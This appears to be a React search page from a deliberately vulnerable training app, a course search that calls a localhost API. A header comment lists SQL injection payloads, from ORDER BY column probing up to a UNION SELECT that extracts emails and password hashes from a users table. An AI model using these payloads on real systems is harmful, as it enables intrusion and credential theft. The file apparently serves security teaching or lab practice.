// https://localhost:3000/vuln-search
/*
' ORDER BY 1 --
' UNION SELECT 1,2,3,4,5 --
' UNION SELECT 0, 'text', 'text', 'text', 0 --
' UNION SELECT 0, email, password_hash, 'text', 0 FROM users --
*/


import React, { useEffect, useState } from "react";

const VulnSearchCourses = () => {
    const [query, setQuery] = useState("");
    const [courses, setCourses] = useState([]);

    const fetchCourses = async () => {
        const url = query
            ? `https://localhost:3443/api/vuln-courses/search?q=${encodeURIComponent(query)}`
            : `https://localhost:3443/api/vuln-courses/search`;

        try {
            const res = await fetch(url, { credentials: "include" });
            const data = await res.json();
            setCourses(Array.isArray(data) ? data : []);
        } catch (err) {
            console.error("❌ Failed to fetch vulnerable courses:", err);
            setCourses([]);
        }
    };

    useEffect(() => {
        fetchCourses(); // load all courses initially
    }, []);

    const handleSearch = (e) => {
        e.preventDefault();
        fetchCourses();
    };

    return (
        <div className="container mt-4">
            <h3>Vulnerable Course Search</h3>
            <form className="d-flex gap-2 my-3" onSubmit={handleSearch}>
                <input
                    type="text"
                    className="form-control"
                    placeholder="Enter course name or teacher email"
                    value={query}
                    onChange={(e) => setQuery(e.target.value)}
                />
                <button type="submit" className="btn btn-danger">Search</button>
            </form>

            <table className="table table-bordered">
                <thead>
                <tr>
                    <th>ID</th>
                    <th>Course Title</th>
                    <th>Description</th>
                    <th>Teacher</th>
                    <th>Enrolled</th>
                </tr>
                </thead>
                <tbody>
                {Array.isArray(courses) && courses.map((course, index) => (
                    <tr key={index}>
                        <td>{course.id}</td>
                        <td>{course.title}</td>
                        <td>{course.description}</td>
                        <td>{course.teacher_email}</td>
                        <td>{course.enrolled_count}</td>
                    </tr>
                ))}
                </tbody>
            </table>
        </div>
    );
};

export default VulnSearchCourses;
